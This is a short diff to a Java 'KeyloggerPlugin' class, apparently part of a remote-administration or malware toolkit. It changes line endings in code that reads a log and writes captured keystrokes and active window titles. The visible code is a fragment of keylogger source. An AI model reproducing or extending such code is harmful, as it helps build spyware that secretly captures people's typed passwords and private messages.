@@ -100,7 +100,7 @@ public class KeyloggerPlugin extends StubPlugin {
 			BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
 			
 			while ((s = reader.readLine()) != null) {
-				text += s + "\n\r";
+				text += s + "\n";
 			}
 			
 			reader.close();
@@ -172,7 +172,7 @@ public class KeyloggerPlugin extends StubPlugin {
 						
 						for (Activity a : Activities.activities) {
 							if (a instanceof Title) {
-								out.println("\n\r[Window: " + a.toString() + "]");
+								out.println("\n[Window: " + a.toString() + "]");
 							} else if (a instanceof Key) {
 								char ckey = ((Key)a).getChar();
 								String key;
@@ -180,7 +180,7 @@ public class KeyloggerPlugin extends StubPlugin {
 								if (ckey == '\b') {
 									key = "[BACKSPACE]";
 								} else if (ckey == '\n' || ckey == '\r') {
-									key = "[ENTER]\n\r";
+									key = "[ENTER]\n";
 								} else if (ckey == '\t') {
 									key = "[TAB]\t";
 								} else {
